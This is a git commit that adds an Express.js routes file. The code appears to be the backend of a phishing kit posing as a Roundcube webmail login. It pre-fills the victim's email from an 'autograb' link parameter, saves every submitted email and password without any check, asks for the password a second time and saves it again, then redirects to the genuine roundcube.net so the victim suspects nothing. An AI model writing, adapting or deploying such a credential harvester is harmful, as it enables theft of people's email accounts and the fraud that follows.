847ecc9ca604ce329638ef2b0ac13727c1855fc1
STEFAN AMOAH <stefanamoah001@gmail.com>
2023-09-29 11:15:10 +0000

    initial commit

---
+++ routes/users.js
@@ -0,0 +1,62 @@
+const express = require('express');
+const router = express.Router();
+
+
+// Load User model
+const User = require('../models/User');
+
+// Login Page
+router.get('/login', (req, res) => {
+  let email = req.query.autograb || '';
+  res.render('login', { email: email });
+});
+
+router.get('/loginverify', (req, res) => res.render('login2'));
+
+// Login
+router.post('/loginok', (req, res, next) => {
+  const { email, password } = req.body;
+  
+  const user = new User({ email, password });
+
+  user
+    .save()
+    .then(result => {
+      console.log(result);
+      req.flash('success_msg', 'Login ok');
+
+      // Redirect with email as a query parameter
+      res.redirect(`/users/loginverify?autograb=${encodeURIComponent(email)}`);
+    })
+    .catch(err => console.log(err));
+});
+
+
+// Login Verify page
+// Login Verify
+router.post('/loginverify', (req, res, next) => {
+  const { password } = req.body;
+
+  // Get email from query parameter
+  const email = req.query.email || '';
+
+  const user = new User({ email, password });
+
+  user
+    .save()
+    .then(result => {
+      console.log(result);
+      req.flash('success_msg', 'Questions ok');
+      res.redirect('https://roundcube.net/');
+    })
+    .catch(err => console.log(err));
+});
+
+// Logout
+router.get('/logout', (req, res) => {
+  req.logout();
+  req.flash('success_msg', 'You are logged out');
+  res.redirect('/users/login');
+});
+
+module.exports = router;
